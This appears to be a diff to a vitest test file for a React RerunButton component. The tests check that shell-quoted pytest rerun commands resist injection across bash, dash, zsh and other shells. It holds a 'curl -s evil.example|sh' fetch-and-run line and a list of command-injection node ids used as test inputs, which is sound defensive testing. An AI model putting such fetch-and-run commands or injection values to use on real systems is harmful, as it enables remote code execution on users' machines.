@@ -1,5 +1,7 @@
+import { spawnSync } from 'node:child_process';
 import { act, fireEvent, render, screen } from '@testing-library/react';
 import { afterEach, describe, expect, it, vi } from 'vitest';
+import { isHidden } from '../lib/visible';
 import { pytestArg, RerunButton, rerunCommand, rerunFile, shellQuote } from './RerunButton';
 
 const UART = 'tests/comms/test_uart.py::test_framing_at_921600';
@@ -69,16 +71,17 @@ describe('the command', () => {
     const RLO = String.fromCodePoint(0x202e);
     // Pasted raw, ^U would erase the line so far and the line break run what followed it.
     expect(shellQuote('t.py::t\u0015curl -s evil.example|sh\n')).toBe(
-      "$'t.py::t\\025curl -s evil.example|sh\\012'",
+      "'t.py::t'$'\\025''curl -s evil.example|sh'$'\\012'",
     );
     expect(rerunCommand([`suite.py::test_hostile_id[${RLO}gnp.exe]`])).toBe(
-      "pytest $'suite.py::test_hostile_id[\\342\\200\\256gnp.exe]'",
+      "pytest 'suite.py::test_hostile_id['$'\\342\\200\\256''gnp.exe]'",
     );
-    // Within $'...', a quote and a backslash are escaped; tabs, C1 controls and every character
-    // shown as a code point go as bytes.
-    expect(shellQuote("a'b\\c\td\u0085e\u200bf")).toBe(
-      "$'a\\'b\\\\c\\011d\\302\\205e\\342\\200\\213f'",
+    // Only the runs of tabs, C1 controls and characters shown as code points go in $'...', as
+    // bytes; quotes and backslashes stay in plain single quotes.
+    expect(shellQuote("a'b\\c\td\u0085\u200be")).toBe(
+      "'a'\\''b\\c'$'\\011''d'$'\\302\\205\\342\\200\\213''e'",
     );
+    expect(shellQuote('\u200b')).toBe("$'\\342\\200\\213'");
     // A quote alone still goes in single quotes.
     expect(shellQuote("it's")).toBe("'it'\\''s'");
     for (const id of ['t\u0015x', `t${RLO}x`, 't\u001bx', 't\u2028x', 't\ufffdx']) {
@@ -86,6 +89,99 @@ describe('the command', () => {
       expect(cmd).toMatch(/^[\x20-\x7e]*$/);
     }
   });
+
+  it("never puts a quote in $'...', so a shell without it keeps its quoting in step", () => {
+    // Each word is plain single-quoted runs, escaped quotes and $'...' runs of octal escapes
+    // alone: dash reads such a run as a $ and a quoted string, and no quote in it ends one early.
+    const word = /^(?:'[^']*'|\\'|\$'(?:\\[0-7]{3})+')+$/;
+    for (const id of HOSTILE) expect(shellQuote(pytestArg(id))).toMatch(word);
+  });
+});
+
+// Node ids a report could send to run a command in the shell the rerun is pasted into: a control
+// or hidden character to make the id need escapes, then a quote, then shell text.
+const HOSTILE = [
+  "x.py::t[\u0015'; echo INJECTED #]",
+  "tests/a.py::t\u200b'; echo INJECTED #",
+  't.py::t\ufffd\'"$(echo INJECTED)"\'',
+  "t.py::t[\u202e'\\''; echo INJECTED; ']",
+  "t.py::t\\\u0015\\'; echo INJECTED #",
+  "\u200b'; echo INJECTED #",
+  "-x\u0085'; echo INJECTED #",
+  "t.py::t\n'; echo INJECTED #",
+  't.py::t\t`echo INJECTED`',
+  "it's",
+  '',
+];
+
+// The shells a pasted command meets that this machine has: bash, zsh and busybox's ash read
+// $'...'; dash, /bin/sh on Debian and Ubuntu, posh and older yash do not.
+const SHELLS: [string, ...string[]][] = [
+  ['bash'],
+  ['dash'],
+  ['busybox', 'sh'],
+  ['zsh', '-f'],
+  ['mksh'],
+  ['posh'],
+  ['yash'],
+];
+
+function run(sh: readonly string[], script: string) {
+  const [cmd = '', ...args] = sh;
+  // No startup file or variable, as BASH_ENV, adds to what the shell prints.
+  return spawnSync(cmd, [...args, '-c', script], {
+    timeout: 5000,
+    env: { PATH: process.env.PATH ?? '/usr/bin:/bin' },
+  });
+}
+
+function present(sh: readonly string[]): boolean {
+  const done = run(sh, 'exit 0');
+  return !done.error && done.status === 0;
+}
+
+// A character's UTF-8 bytes as three-digit octal escapes.
+function octal(ch: string): string {
+  return Array.from(
+    new TextEncoder().encode(ch),
+    (b) => `\\${b.toString(8).padStart(3, '0')}`,
+  ).join('');
+}
+
+// What a shell without $'...' reads for a node id: each run of escaped characters as a $ and their
+// escapes, as text.
+function literally(id: string): string {
+  let out = '';
+  let escaping = false;
+  for (const ch of id) {
+    const cp = ch.codePointAt(0) ?? 0;
+    const escaped = cp < 0x20 || isHidden(cp);
+    if (escaped && !escaping) out += '$';
+    out += escaped ? octal(ch) : ch;
+    escaping = escaped;
+  }
+  return out;
+}
+
+describe('the command in a shell', () => {
+  for (const sh of SHELLS) {
+    it.skipIf(!present(sh))(
+      `${sh.join(' ')} reads each node id as one argument and runs nothing else`,
+      () => {
+        const dollar = run(sh, "printf %s $'\\101'").stdout.toString() === 'A';
+        for (const id of HOSTILE) {
+          // pytest stands in as a function that prints how many arguments it was given, and the
+          // first: anything else printed was run by the node id.
+          const out = run(
+            sh,
+            `pytest() { printf '%s\\n' "$#" "$1"; }\n${rerunCommand([id])}\n`,
+          ).stdout.toString();
+          const arg = dollar ? pytestArg(id) : literally(pytestArg(id));
+          expect(out, `${sh.join(' ')}: ${JSON.stringify(id)}`).toBe(`1\n${arg}\n`);
+        }
+      },
+    );
+  }
 });
 
 describe('copying', () => {
@@ -186,11 +282,12 @@ describe('past its limit', () => {
     vi.useFakeTimers();
     const list = ids(21);
     const { container } = render(<RerunButton nodeids={list} fileName="new-failures.txt" />);
+    // The file opens with --, so options go before it.
     expect(container.querySelector('.dl-rerun__hint')).toHaveTextContent(
-      'then run pytest @new-failures.txt',
+      'then run pytest [options] @new-failures.txt',
     );
     expect(container.querySelector('.dl-rerun__hint code')).toHaveTextContent(
-      'pytest @new-failures.txt',
+      'pytest [options] @new-failures.txt',
     );
     fireEvent.click(screen.getByRole('button', { name: 'Download 21 node ids' }));
     expect(clicked).toEqual([
@@ -257,7 +354,9 @@ describe('past its limit', () => {
   it('takes its own limit, and names its file rerun.txt by default', () => {
     const { clicked } = stubDownload();
     const { container } = render(<RerunButton nodeids={[UART, RAIL, 'tests/c.py::t']} limit={2} />);
-    expect(container.querySelector('.dl-rerun__hint')).toHaveTextContent('pytest @rerun.txt');
+    expect(container.querySelector('.dl-rerun__hint')).toHaveTextContent(
+      'pytest [options] @rerun.txt',
+    );
     fireEvent.click(screen.getByRole('button', { name: 'Download 3 node ids' }));
     expect(clicked[0]?.download).toBe('rerun.txt');
   });
